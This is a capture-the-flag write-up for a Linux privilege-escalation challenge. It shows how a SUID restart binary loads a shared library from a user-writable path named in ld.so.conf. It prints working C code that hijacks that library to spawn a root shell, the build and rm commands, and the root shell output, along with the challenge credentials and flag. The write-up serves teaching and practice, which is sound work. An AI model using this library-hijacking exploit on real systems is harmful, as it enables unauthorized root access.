# BlackOps

### Category

System

### Description

You asked a friend to set you up with a few samples of http server in different languages for you to test out. He opened an access to one of his machines. He didn't give you admin access, but maybe there is a way to play a trick on him ;)

The base credentials are:
```
user1:password123
```

Format : **Hero{flag}**<br>
Author : **Log_s**

### Write up

First thing we notice, is the `servers` folder. There is the following note in it:
```
Hi !

Here is the servers sample you ordered. I had troubles with some libraries on a few test systems. Removing them does the trick for now, until I find a fix.
For security reasons, you can't edit any files, but I copied you an SUID enabled copy of the rm binary, if you need to remove files in order to run the project.

Cheers
```
So we have a SUID rm binary. GTFObins does not reference a way to elevate privileges with the rm binary, so there is little chance that this alone is the way to root.

Let's check if there are other SUID enabled binaries.
```
$ find / -perm -4000 2> /dev/null
/bin/su
/bin/umount
/bin/mount
/home/user1/servers/utils/restart_servers
/home/user1/servers/rm
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
```

`/home/user1/servers/utils/restart_servers` is in the same folder, let's check it out.

```
$ file restart_servers 
restart_servers: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=037d8a491f80ebc4daa6f9c41815f0b3d49cef82, stripped
$ ./restart_servers 
[*] Cleaning all servers
	[*] Killing server server.js
	[*] Killing server server.go
	[*] Killing server server.py
[*] All servers cleaned
[*] Restart services
[*] Services restarted
```
Based on the binary output, it's used to kill the servers, free the used ports, and restart the servers.

Let's check what is going on when the binary is ran. To achieve this, I'm going to us the pspy binary.

```
scp -P 22 pspy64s user1@localhost:~
```

Let's run it and check the processes.

```
2022/05/26 18:30:06 CMD: UID=0    PID=418    | ./restart_servers 
2022/05/26 18:30:06 CMD: UID=0    PID=419    | sh -c /sbin/ldconfig 
2022/05/26 18:30:06 CMD: UID=0    PID=420    | /bin/sh /sbin/ldconfig 
2022/05/26 18:30:06 CMD: UID=0    PID=421    | /bin/kc 
2022/05/26 18:30:06 CMD: UID=0    PID=422    | /usr/bin/pkill server.js 
2022/05/26 18:30:06 CMD: UID=0    PID=423    | /usr/bin/pkill server.go 
2022/05/26 18:30:06 CMD: UID=0    PID=424    | /usr/bin/pkill server.py 
2022/05/26 18:30:06 CMD: UID=0    PID=427    | /usr/bin/python3 /home/user1/servers/src/server.py 
2022/05/26 18:30:06 CMD: UID=0    PID=426    | /home/user1/servers/src/server.go 
2022/05/26 18:30:06 CMD: UID=0    PID=425    | /usr/bin/node /home/user1/servers/src/server.js
```
There are a few things going on here. Our binary runs other processes:
 - ldconfig: configure dynamic linker run-time bindings
 - kc: ???
 - pkill: kills a process by mathcing the name
 - server.py
 - server.go
 - server.js

If you try to run /bin/kc, you'll understand that the process tree looks like this:
```
restart_servers
├── ldconfig
├── kc
    └─ pkill
├── server.py
├── server.js
└── server.go
```

Every call is made using the absolute path, so path injections won't be an option here.

But `ldconfig` is a very good hint. It has probably something to do with shared libraries.

```
$ ldd /bin/kc
	linux-vdso.so.1 (0x00007ffcb47e3000)
	libgenprocs.so => /home/user1/servers/libs/libgenprocs.so (0x00007f32a91b0000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f32a8dbf000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f32a95b4000)
```
The `kc` binary (kill connection) uses a shared library `/home/user1/servers/libs/libgenprocs.so`. The folder `/home/user1/servers/libs/` is not writable by our current user.

Let's find out, how `kc` knows where to look for the library. There are a few ways to indicate the location of a dynamic shared library. Some of then are using environment variables, like `LD_LIBRARY_PATH`. We have no indication that such variables are kept during our call at the SUID binary.

Another way is to reference the path in `/etc/ld.so.conf`.

```
$ cat /etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf
$ ls /etc/ld.so.conf.d/
libc.conf  servers.conf  x86_64-linux-gnu.conf
$ cat /etc/ld.so.conf.d/servers.conf 
/home/user1/servers/libs/
/home/user1/
```
So binaries will among other things look for the shared libraries in `/home/user1/servers/libs/` and `/home/user1/` folders. The second one is our home directory, so writable by us.

Before writing the exploit, we need to figure out the name of the function that `kc` calls.

A simple strings will to the job.
```
$ strings libgenprocs.so 
__gmon_start__
_init
_fini
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
genprocs <-----
_edata
__bss_start
_end
...
```

Let's write a generic library hijacking exploit...
```c
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void genprocs() {
        printf("[%] Running exploit\n");
        setreuid(geteuid(), geteuid());
        execve("/bin/sh", 0, 0);
}
```
...and compile it.
```bash
gcc -fPIC -shared -o libgenprocs.so exploit.c
```

Last thing is to get rid of the legitimate library using the SUID rm binary.

```
$ servers/rm servers/libs/libgenprocs.so 
```

We don't have to worry about relinking, because `ldconfig`  is called as root when running `restart_servers`.

```
$ ./restart_servers 
[*] Cleaning all severs
[%] Running exploit
# id
uid=0(root) gid=1000(user1) groups=1000(user1)
```

### Flag

```
Hero{h1j4cked_l1k3_1n_Bl4ck_0ps}
```
